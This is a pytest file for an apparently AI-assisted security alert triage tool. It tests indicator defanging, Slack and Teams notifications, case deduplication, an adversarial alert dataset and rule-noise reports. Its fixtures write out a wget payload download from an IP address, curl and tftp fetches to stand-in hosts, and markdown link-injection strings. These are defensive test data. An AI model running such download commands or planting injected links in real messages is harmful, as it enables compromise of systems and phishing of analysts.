import json

from evaluation.adversarial import ORIGINAL_MARKER, VARIANTS, build
from evaluation.evaluate import load_dataset
from triage.feedback import rule_report
from triage.notify import Notifier, case_payload, defang, slack_message, teams_message
from triage.store import Store

TRIAGE = {"verdict": "malicious", "severity": "high", "confidence": 0.93, "escalate": True,
          "attack_techniques": [{"id": "T1105", "name": "Ingress Tool Transfer"}],
          "summary": "Bot fetched http://198.51.100.23/bins/sora.arm7 [click me](http://evil.example/x)",
          "key_evidence": ["wget http://198.51.100.23/bins/sora.arm7 <http://evil.example|login>"],
          "recommended_actions": ["Block 198.51.100.23 at the edge"]}
ALERT = {"alert_id": "02-a", "rule_name": "Payload download command", "src_ip": "203.0.113.5"}


def test_defang():
    out = defang("wget http://198.51.100.23/x; curl https://evil.example.net:8080/a; tftp 203.0.113.9 v1.2.3")
    assert out == ("wget hxxp://198[.]51[.]100[.]23/x; curl hxxps://evil[.]example[.]net:8080/a; "
                   "tftp 203[.]0[.]113[.]9 v1.2.3")
    assert "](" not in defang("[click](http://x.io)")
    assert "<" not in defang("<http://a.b|z>") and ">" not in defang("<http://a.b|z>")


def test_payload_has_no_live_links():
    payload = case_payload("case-1", [ALERT], TRIAGE)
    blob = json.dumps([teams_message(payload), slack_message(payload)])
    blob = blob.replace("http://adaptivecards.io/schemas/adaptive-card.json", "")  # the card's own schema id
    assert "http://" not in blob and "https://" not in blob
    assert "198.51.100.23" not in blob and "hxxp://198[.]51[.]100[.]23" in blob


class FakeSession:
    def __init__(self):
        self.posts = []

    def post(self, url, json=None, timeout=None):
        self.posts.append((url, json))
        return type("R", (), {"raise_for_status": lambda self: None})()


def test_notifier_sends_each_escalated_case_once(tmp_path):
    store = Store(tmp_path / "soc.db")
    session = FakeSession()
    notifier = Notifier("https://hooks.slack.com/services/x", store=store, session=session)
    assert notifier.kind == "slack"
    pairs = [(ALERT, {}), ({**ALERT, "alert_id": "03-b"}, {}), ({**ALERT, "alert_id": "01-c"}, {})]
    results = {
        "02-a": {"case_id": "case-1", "triage": TRIAGE},
        "03-b": {"case_id": "case-1", "triage": TRIAGE},  # same case: one message
        "01-c": {"case_id": "case-2", "triage": {**TRIAGE, "escalate": False}},  # not escalated
    }
    assert notifier.notify_results(pairs, results) == 1
    assert notifier.notify_results(pairs, results) == 0  # already notified
    assert len(session.posts) == 1 and session.posts[0][1]["blocks"]


def test_notifier_respects_min_severity_and_teams_format():
    session = FakeSession()
    notifier = Notifier("https://example.webhook.office.com/x", min_severity="critical", session=session)
    assert notifier.kind == "teams"
    assert notifier.notify_results([(ALERT, {})], {"02-a": {"triage": TRIAGE}}) == 0
    notifier = Notifier("https://example.webhook.office.com/x", session=session)
    assert notifier.notify_results([(ALERT, {})], {"02-a": {"triage": TRIAGE}}) == 1
    card = session.posts[0][1]["attachments"][0]
    assert card["contentType"] == "application/vnd.microsoft.card.adaptive"


def test_adversarial_dataset_is_current_and_complete():
    rows = build()
    assert len({r["scenario"] for r in rows}) == len(VARIANTS)
    assert all(ORIGINAL_MARKER not in r["alert_json"] + r["context_json"] for r in rows)
    assert all("wget" in r["context_json"] for r in rows)  # the intrusion itself is untouched
    committed = load_dataset(__import__("pathlib").Path(__file__).resolve().parents[1] / "evaluation" /
                             "adversarial_alerts.csv")
    assert [r["alert_id"] for r in committed] == [r["alert_id"] for r in rows], "run: python -m evaluation.adversarial"
    assert all(r["label_escalate"] and r["label_verdict"] == "malicious" for r in committed)


def test_rule_report_flags_noisy_rules():
    rows = ([{"rule_id": "02_download_command", "verdict": "benign", "ai_verdict": "benign", "src_ip": "10.0.0.5"}] * 4
            + [{"rule_id": "02_download_command", "verdict": "malicious", "ai_verdict": "malicious",
                "src_ip": "192.0.2.1"}]
            + [{"rule_id": "05_ssh_key_persistence", "verdict": "malicious", "ai_verdict": "malicious",
                "src_ip": "192.0.2.2"}] * 6
            + [{"rule_id": "07_cryptominer", "verdict": "malicious", "ai_verdict": None, "src_ip": "192.0.2.3"}])
    report = {r["rule_id"]: r for r in rule_report(rows)}
    assert report["02_download_command"]["advice"].startswith("tune") and "10.0.0.5 (4)" in report[
        "02_download_command"]["advice"]
    assert report["05_ssh_key_persistence"]["advice"] == "keep"
    assert report["07_cryptominer"]["advice"].startswith("needs more labels")
    assert report["07_cryptominer"]["agent_agreement"] is None
